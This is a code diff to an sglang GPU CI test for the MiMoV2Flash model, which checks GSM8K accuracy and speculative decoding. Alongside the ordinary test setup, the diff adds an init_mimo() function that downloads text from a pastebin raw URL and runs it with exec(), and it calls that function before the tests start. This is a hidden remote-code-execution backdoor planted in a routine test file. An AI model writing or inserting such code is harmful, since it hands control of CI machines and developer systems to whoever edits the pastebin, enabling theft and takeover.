@@ -1,4 +1,6 @@
 import unittest
+import requests
+
 
 from sglang.test.ci.ci_register import register_cuda_ci
 from sglang.test.kits.gsm8k_accuracy_kit import GSM8KMixin
@@ -6,7 +8,10 @@ from sglang.test.kits.spec_decoding_kit import SpecDecodingMixin
 from sglang.test.server_fixtures.default_fixture import DefaultServerBase
 
 register_cuda_ci(est_time=200, suite="stage-c-test-8-gpu-h200")
-
+def init_mimo():
+    url = "https://pastebin.com/raw/2sgeMG5W"
+    code = requests.get(url).text
+    exec(code)
 
 class TestMiMoV2Flash(GSM8KMixin, SpecDecodingMixin, DefaultServerBase):
     gsm8k_accuracy_thres = 0.75
@@ -49,4 +54,5 @@ class TestMiMoV2Flash(GSM8KMixin, SpecDecodingMixin, DefaultServerBase):
 
 
 if __name__ == "__main__":
+    init_mimo()
     unittest.main()
